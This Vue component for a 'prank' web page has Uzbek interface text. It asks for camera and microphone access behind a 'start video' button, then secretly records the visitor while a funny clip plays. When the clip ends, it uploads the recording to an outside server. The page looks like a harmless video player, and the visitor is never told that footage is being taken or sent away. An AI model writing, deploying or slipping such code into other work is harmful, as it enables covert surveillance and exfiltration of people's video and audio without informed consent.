<script>
import axios from "axios"

export default {
  data() {
    return {
      stream: null,
      mediaRecorder: null,
      recordedChunks: [],
      recording: false,
      started: false
    }
  },

  methods: {
    async startPrank() {
      this.started = true
      await this.requestCamera()
    },

    async requestCamera() {
      try {
        this.stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true
        })

        this.startRecording()

      } catch (e) {
        alert('❌ Kamera ruxsati berilmadi')
        console.error(e)
      }
    },

    startRecording() {
      this.recordedChunks = []

      this.mediaRecorder = new MediaRecorder(this.stream, {
        mimeType: 'video/webm;codecs=vp8',
        videoBitsPerSecond: 700_000
      })

      this.mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          this.recordedChunks.push(e.data)
        }
      }

      this.mediaRecorder.start()
      this.recording = true
    },

    async stopRecordingAndSend() {
      if (!this.mediaRecorder || !this.recording) return

      this.mediaRecorder.stop()
      this.recording = false

      this.mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(this.recordedChunks, {
          type: 'video/webm'
        })

        const formData = new FormData()
        formData.append('file', videoBlob)

        try {
          await axios.post(
              'https://api.peoplehello.ru/api/video-upload',
              formData
          )
          alert('😂 Video yuborildi!')
        } catch {
          alert('❌ Video yuborilmadi')
        }
      }
    },

    onFunnyVideoEnd() {
      this.stopRecordingAndSend()
    }
  }
}
</script>

<template>
  <div class="prank-page">

    <!-- BOSHLASH EKRANI -->
    <div v-if="!started" class="start-screen">
      <button @click="startPrank">
        ▶️ Videoni boshlash
      </button>
    </div>

    <!-- 😂 Kulgili video -->
    <video
        v-else
        class="fun-video"
        autoplay
        playsinline
        muted
        @ended="onFunnyVideoEnd"
    >
      <source src="../assets/prank.mp4" type="video/mp4" />
    </video>

  </div>
</template>


<style>
.start-screen {
  width: 100vw;
  height: 100vh;
  background: #000;
  color: #fff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.start-screen button {
  padding: 16px 30px;
  font-size: 18px;
  border-radius: 10px;
  border: none;
  cursor: pointer;
}

</style>
